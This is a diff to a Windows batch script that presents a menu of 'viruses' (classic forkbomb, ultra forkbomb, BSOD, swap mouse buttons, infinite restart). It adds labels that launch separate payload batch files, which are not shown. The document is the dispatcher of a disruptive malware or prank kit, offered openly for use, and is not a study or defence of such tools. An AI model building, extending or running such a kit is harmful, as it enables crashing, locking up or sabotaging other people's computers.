@@ -22,20 +22,39 @@ echo ^|                                                 1. Classic forkbomb     
 echo ^|                                                                                                                     ^|
 echo ^|                                                  2. Ultra forkbomb                                                  ^|
 echo ^|                                                                                                                     ^|
-echo ^|                                                     3. Virus 3                                                      ^|
+echo ^|                                                      3. BSOD                                                        ^|
 echo ^|                                                                                                                     ^|
-echo ^|                                                     4. Virus 4                                                      ^|
+echo ^|                                                4. Swap mouse buttons                                                ^|
 echo ^|                                                                                                                     ^|
-echo ^|                                                     5. Virus 5                                                      ^|
+echo ^|                                                5. Infinite restart                                                  ^|
 echo ^|                                                                                                                     ^|
 echo ^|                                                                                                                     ^|
 echo ^|_____________________________________________________________________________________________________________________^|
 echo.
 echo.
-choice /c:12345 /n /m "Select a virus: "
+choice /c:12345 /n /m "|"
 if %errorlevel%==1 goto virus1
 if %errorlevel%==2 goto virus2
 if %errorlevel%==3 goto virus3
 if %errorlevel%==4 goto virus4
 if %errorlevel%==5 goto virus5
 
+:virus1
+start forkbomb-classic.bat
+exit
+
+:virus2
+start forkbomb-ultra.bat
+exit
+
+:virus3
+start bsod.bat
+exit
+
+:virus4
+start swapmouse.bat
+exit
+
+:virus5
+start restart.bat
+exit
